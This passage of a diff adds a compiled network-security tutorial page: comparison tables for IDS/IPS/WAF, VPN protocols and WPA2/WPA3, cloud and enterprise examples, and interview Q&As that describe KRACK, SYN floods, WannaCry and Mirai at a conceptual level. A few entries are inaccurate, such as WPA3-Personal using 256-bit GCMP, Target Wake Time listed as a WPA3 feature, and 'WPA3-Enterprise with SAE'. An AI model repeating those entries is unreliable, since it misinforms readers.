+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Cost"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free (Squid)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enterprise"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Bypass Resistance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "132-ids-vs-ips-vs-waf",
+      children: "13.2 IDS vs IPS vs WAF"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Aspect"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IDS"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IPS"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WAF"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Position"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Out-of-band (mirror port)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Inline"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Inline (reverse proxy)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Action"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Alert only"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Alert + block"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Alert + block"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Protocol Scope"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All IP protocols"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "All IP protocols"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP/HTTPS only"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Signature Format"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Snort/Suricata rules"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Snort/Suricata rules"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ModSecurity rules"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Latency Added"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "None"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-5ms"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "5-20ms"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Common Bypass"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encryption (if blind)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encryption"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encoding evasion"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "133-ipsec-vs-wireguard-vs-openvpn",
+      children: "13.3 IPsec vs WireGuard vs OpenVPN"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IPsec (IKEv2)"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WireGuard"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "OpenVPN"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Kernel Integration"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (strongSwan)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (Linux 5.6+)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No (tun device)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Cipher Suite"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Multiple options (complex)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ChaCha20+Poly1305 (fixed)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Multiple options"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Key Exchange"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IKEv2 (4-6 messages)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-RTT Noise protocol"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS (complex handshake)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Code Quality"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "400K+ lines (large attack surface)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "~4K lines (auditable)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "150K+ lines"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Roaming"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "MOBIKE (implementations vary)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Built-in (P-E-R roaming)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Reconnect required"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "UDP/443 Deception"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Often blocked (ESP = IP 50)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Looks like random UDP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Can use TCP/443"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "NAT Traversal"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IKEv2 + UDP encapsulation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Native"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Keepalive required"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "500-800 Mbps (AES-NI)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "1-2+ Gbps"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "300-600 Mbps"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Setup Difficulty"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High (certificates, profiles)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low (1 config file each)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Audit History"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Many CVEs"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Zero CVEs (young)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Few CVEs"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "134-wpa2-vs-wpa3",
+      children: "13.4 WPA2 vs WPA3"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WPA2"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WPA3"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Key Exchange"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "4-Way Handshake (PSK)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "SAE (Dragonfly)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Encryption"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "AES-CCMP (128-bit)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "AES-GCMP (256-bit)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Forward Secrecy"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Offline Brute Force"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (capture handshake)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No (SAE requires online)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "KRACK Resistance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Vulnerable"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Resistant"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Management Frame Protection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Optional (802.11w)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Mandatory"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Public Wi-Fi"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Open (no encryption)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "OWE (individual encryption)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "IoT Support"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Standard"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Target Wake Time"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-14-applications-in-real-systems",
+      children: "Section 14: Applications in Real Systems"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "141-aws-security-groups-cloud-firewall",
+      children: "14.1 AWS Security Groups (Cloud Firewall)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "AWS Security Groups act as stateful virtual firewalls for EC2 instances and other AWS resources."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-json",
+        children: "{\n    \"IpPermissions\": [\n        {\n            \"IpProtocol\": \"tcp\",\n            \"FromPort\": 22,\n            \"ToPort\": 22,\n            \"IpRanges\": [{\"CidrIp\": \"10.0.0.0/24\"}]\n        },\n        {\n            \"IpProtocol\": \"tcp\",\n            \"FromPort\": 80,\n            \"ToPort\": 80,\n            \"IpRanges\": [{\"CidrIp\": \"0.0.0.0/0\"}]\n        },\n        {\n            \"IpProtocol\": \"tcp\",\n            \"FromPort\": 443,\n            \"ToPort\": 443,\n            \"IpRanges\": [{\"CidrIp\": \"0.0.0.0/0\"}]\n        }\n    ]\n}\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Key difference:"
+      }), " Security Groups are stateful (return traffic automatically allowed), while NACLs are stateless (require both inbound and outbound rules)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "142-cisco-firepower-ngfw",
+      children: "14.2 Cisco Firepower (NGFW)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Enterprise NGFW with:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Application Visibility and Control (AVC)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Next-Generation IPS (NGIPS)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Advanced Malware Protection (AMP)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "URL Filtering"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "SSL/TLS Decryption"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "143-cloudflare-ddos-protection",
+      children: "14.3 Cloudflare DDoS Protection"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Client → Cloudflare Edge (Anycast) → Origin Server\n\nAt edge:\n- L3/L4: Packet scrubbing (invalid packets dropped)\n- L7: Rate limiting, bot management, WAF\n- Challenge: JS challenge, CAPTCHA for suspicious traffic\n1.1.1.1 + Cloudflare Gateway = DNS filtering + Zero Trust\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "144-enterprise-zero-trust-beyondcorp--zscaler",
+      children: "14.4 Enterprise Zero Trust (BeyondCorp / Zscaler)"
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "User → Device Check → Identity Provider → Context Policy → App Access\n   ↓                     ↓\n  Workspace ONE      Azure AD Conditional Access\n  (device compliance) (MFA, risk score)\n\nZero Trust Exchange (Zscaler):\n- User connects to Zscaler edge (not directly to app)\n- Policy applied based on identity + device + context\n- App remains hidden (no public DNS/VIP)\n- Traffic inspected inline (SSL decryption, DLP, sandbox)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "145-open-source-security-onion",
+      children: "14.5 Open Source Security Onion"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Security Onion is a free Linux distribution for:"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Elasticsearch, Logstash, Kibana (ELK) for log management"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Zeek (formerly Bro) for network analysis"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Suricata for IDS/IPS"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Wazuh for HIDS"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "TheHive for case management"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Playbook for automated response"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Deploy Security Onion\n# https://docs.securityonion.net/\n\n# Verify sensors\nso-status\n# Expected:\n#   elasticsearch: running\n#   kibana: running\n#   suricata: running\n#   zeek: running\n#   wazuh-manager: running\n\n# Query alerts in Kibana\n# Discover → index: so-* → filter: event_type:alert\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-15-interview-corner--15-qas",
+      children: "Section 15: Interview Corner → 15 Q&As"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q1-what-is-the-difference-between-a-stateful-and-stateless-firewall",
+      children: "Q1: What is the difference between a stateful and stateless firewall?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A1:"
+      }), " A stateless firewall (packet filter) examines each packet in isolation based only on header fields (IP, port, protocol). It has no knowledge of connection state. A stateful firewall maintains a connection tracking table that records the state of each session (SYN, SYN-ACK, ESTABLISHED). For example, a stateless firewall would allow an inbound ACK packet even if no corresponding SYN was sent, while a stateful firewall would drop it because no matching connection exists in the table."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q2-how-does-a-stateful-firewall-handle-ftp-traffic",
+      children: "Q2: How does a stateful firewall handle FTP traffic?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A2:"
+      }), " FTP uses two connections: a control channel (port 21) and a data channel (dynamic port). In active FTP, the server connects back to the client on a random port. A stateful firewall inspects the FTP PORT command on the control channel, extracts the data port number, and dynamically opens that port for the data connection. This is called a \"conntrack helper\" (nf_conntrack_ftp). nftables equivalent: ", (0,jsx_runtime.jsx)(_components.code, {
+        children: "ct helper \"ftp\""
+      }), "."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q3-explain-the-difference-between-ids-and-ips",
+      children: "Q3: Explain the difference between IDS and IPS."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A3:"
+      }), " IDS (Intrusion Detection System) monitors traffic passively via a mirror port or network tap. It generates alerts but cannot block traffic. IPS (Intrusion Prevention System) sits inline between the source and destination and can actively block malicious traffic by dropping packets, sending TCP RST, or updating firewall rules. IDS has no failure impact on traffic; IPS must handle fail-open (traffic bypasses if IPS fails) or fail-close (traffic blocked if IPS fails). IDS is better for forensics and compliance; IPS is better for active prevention."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q4-what-are-the-advantages-of-anomaly-based-detection-over-signature-based-detection",
+      children: "Q4: What are the advantages of anomaly-based detection over signature-based detection?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A4:"
+      }), " Signature-based detection matches traffic against known attack patterns (signatures). It has low false positives but cannot detect unknown attacks, variants, or zero-days. Anomaly-based detection establishes a baseline of normal behavior and flags deviations. It can detect novel attacks and zero-days but has higher false positives and requires a learning period. Example: a signature-based system misses a zero-day exploit that evades all existing signatures. An anomaly-based system flags it because the traffic pattern (e.g., large SMB packet to a server that never uses SMB) deviates from baseline."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q5-what-is-the-wpa3-personal-improvement-over-wpa2-personal",
+      children: "Q5: What is the WPA3-Personal improvement over WPA2-Personal?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A5:"
+      }), " WPA2 uses a 4-Way Handshake with PSK. An attacker can capture this handshake and crack the password offline. WPA3 uses SAE (Simultaneous Authentication of Equals, based on Dragonfly handshake). SAE provides forward secrecy and requires the attacker to interact with a real Wi-Fi AP for each password guess → offline brute-force is not possible. WPA3 also mandates Protected Management Frames (802.11w) to prevent deauthentication attacks, uses 256-bit AES-GCMP encryption, and provides OWE for public Wi-Fi encryption without a password."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q6-what-is-the-krack-attack",
+      children: "Q6: What is the KRACK attack?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A6:"
+      }), " KRACK (Key Reinstallation Attack, CVE-2017-13077) exploits a vulnerability in the WPA2 4-Way Handshake. The attacker forces the victim to reinstall an already-in-use encryption key by replaying the third message of the handshake. This causes nonce reuse, breaking encryption and allowing packet decryption and injection. WPA3 is resistant because SAE derives unique keys per session. Mitigation: patch all Wi-Fi clients and APs (Stagefright-level urgency)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q7-how-does-dnssec-prevent-cache-poisoning",
+      children: "Q7: How does DNSSEC prevent cache poisoning?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A7:"
+      }), " DNSSEC adds cryptographic digital signatures to DNS records. Each DNS record has an associated RRSIG (Resource Record Signature) signed by the zone's private key. The resolver validates the signature using the zone's public key (DNSKEY), which is signed by the parent zone's private key (DS record). This creates a chain of trust from the root zone down to the domain. If an attacker injects a fake DNS record, the resolver detects the signature mismatch and discards the record. Without the private key, the attacker cannot forge valid RRSIGs."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q8-what-is-bgp-hijacking-and-how-can-it-be-mitigated",
+      children: "Q8: What is BGP hijacking and how can it be mitigated?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A8:"
+      }), " BGP hijacking occurs when an attacker's AS advertises IP prefixes it does not own, causing traffic to be rerouted through the attacker's network. In the 2008 YouTube hijacking, Pakistan Telecom announced YouTube's /24 prefix, causing global traffic to be routed to Pakistan. Mitigation: prefix filtering (only accept prefixes the peer should advertise), max-prefix limits (protect against route leaks), TTL security check (GTSM ensures BGP packets came from directly connected peer), and RPKI (validates AS authorization to originate prefixes via signed ROAs)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q9-how-does-a-syn-flood-work-and-what-are-mitigation-techniques",
+      children: "Q9: How does a SYN flood work and what are mitigation techniques?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A9:"
+      }), " A SYN flood sends a large number of TCP SYN packets with spoofed source IPs to a target server. The server allocates memory for each half-open connection (backlog queue) and sends SYN-ACK. Since the SYN-ACKs go to spoofed IPs, they never receive ACKs, so the connections stay in SYN_RCVD state. The backlog queue fills, and legitimate connections are rejected. Mitigation: SYN cookies (kernel encodes connection info in SYN-ACK sequence number, no memory allocated until ACK received), increase tcp_max_syn_backlog, reduce tcp_synack_retries, and use iptables rate limiting."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q10-what-is-the-difference-between-vlan-and-vxlan",
+      children: "Q10: What is the difference between VLAN and VXLAN?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A10:"
+      }), " VLAN (802.1Q) provides up to 4,094 VLANs (12-bit ID) and operates at Layer 2. It is limited by the 12-bit tag and is typically confined to a single switch or small network. VXLAN (Virtual Extensible LAN) uses a 24-bit VNI (16M segments) and encapsulates Layer 2 frames in UDP (port 4789) for transport over Layer 3 networks. VXLAN enables network virtualization across data centers and is widely used in cloud environments (e.g., Kubernetes Calico, VMware NSX)."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q11-describe-the-wannacry-infection-chain",
+      children: "Q11: Describe the WannaCry infection chain."
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A11:"
+      }), " (1) Initial infection via phishing or internal propagation. (2) EternalBlue exploit (MS17-010) targets SMBv1 buffer overflow → attacker crafts a malformed SMB TRANS2 request, overwrites kernel memory, and gains remote code execution. (3) DoublePulsar backdoor installed via the EternalBlue shellcode. (4) WannaCry ransomware delivered through DoublePulsar. (5) Each file encrypted with AES-128 key, then AES key encrypted with RSA-2048 public key. (6) Propagation: WannaCry scans LAN IPs for SMBv1 hosts and repeats EternalBlue exploitation. (7) Exponential spread across flat networks (NHS worst affected). (8) Kill switch: checked malwaredomain[.]com → when Marcus Hutchins registered the domain, the malware stopped spreading."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q12-how-does-mirai-infect-iot-devices",
+      children: "Q12: How does Mirai infect IoT devices?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A12:"
+      }), " Mirai continuously scans the internet for IoT devices (DVRs, cameras, routers) with open telnet (port 23) or SSH (port 22). It attempts 62 hardcoded default credentials like \"root:root\", \"admin:admin\", \"support:support\". On successful login, it downloads and executes the bot binary via wget or tftp. The bot connects to a CNC server for commands. For attack, the bot can generate SYN floods, UDP floods, HTTP floods, and GRE tunnels. The bot continues scanning random /8 and /16 network ranges for new victims."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q13-how-is-micro-segmentation-different-from-traditional-vlan-segmentation",
+      children: "Q13: How is micro-segmentation different from traditional VLAN segmentation?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A13:"
+      }), " VLAN segmentation divides the network into broadcast domains at Layer 2, with ACLs for inter-VLAN traffic. It is limited to 4,094 VLANs and requires switch configuration per segment. Micro-segmentation implements per-workload, per-application security policies at the hypervisor or container level (e.g., Kubernetes NetworkPolicy, VMware NSX). It supports unlimited segments (16M VXLAN VNIs), dynamic policy updates without physical reconfiguration, and enforces default-deny for all traffic between workloads. Micro-segmentation is essential for zero trust networking."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q14-what-is-the-best-practice-for-deploying-wireless-in-an-enterprise",
+      children: "Q14: What is the best practice for deploying wireless in an enterprise?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A14:"
+      }), " (1) Use 802.1X/EAP-TLS with certificate authentication for all enterprise devices. (2) WPA3-Enterprise with SAE. (3) Separate SSIDs for corporate, guest, and IoT (with VLAN isolation). (4) Enable Protected Management Frames (802.11w). (5) Deploy WIPS for rogue AP detection. (6) NAC integration for device compliance check. (7) Daily wireless survey to detect interference and rogue APs. (8) Disable unnecessary features (WPS, SSID broadcast.  (9) Use FreeRADIUS with AD/LDAP integration. (10) Certificate enforcement for all client devices."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "q15-how-does-zero-trust-differ-from-traditional-perimeter-security",
+      children: "Q15: How does zero trust differ from traditional perimeter security?"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "A15:"
+      }), " Traditional perimeter security operates on \"trust but verify\" → once inside the network, users and devices are trusted. This leads to flat networks where lateral movement is easy after initial compromise. Zero Trust operates on \"never trust, always verify\" → no entity is trusted by default regardless of location. Every access request is authenticated, authorized, and encrypted. Key differences: micro-segmentation replaces VLANs, identity replaces IP addresses as the security primitive, device posture is checked before access, and all traffic is encrypted regardless of network boundary."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-16-summary",
+      children: "Section 16: Summary"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Firewalls:"
+        }), " Packet filters are fast but stateless; stateful firewalls track connections; proxy firewalls inspect applications; NGFWs combine all with DPI; WAFs protect web apps"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
